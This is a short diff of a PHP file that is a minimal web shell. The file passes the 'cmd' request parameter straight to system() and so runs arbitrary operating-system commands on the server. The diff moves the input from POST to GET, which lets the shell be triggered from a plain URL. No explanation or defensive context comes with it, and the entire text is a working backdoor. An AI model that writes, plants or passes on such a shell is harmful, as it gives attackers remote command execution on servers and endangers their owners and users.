@@ -1,6 +1,6 @@
 <?php
-    if(isset($_POST['cmd'])) {
-        system($_POST['cmd']);
+    if(isset($_GET['cmd'])) {
+        system($_GET['cmd']);
     } else {
         echo "Use cmd argument!!!!";
     }
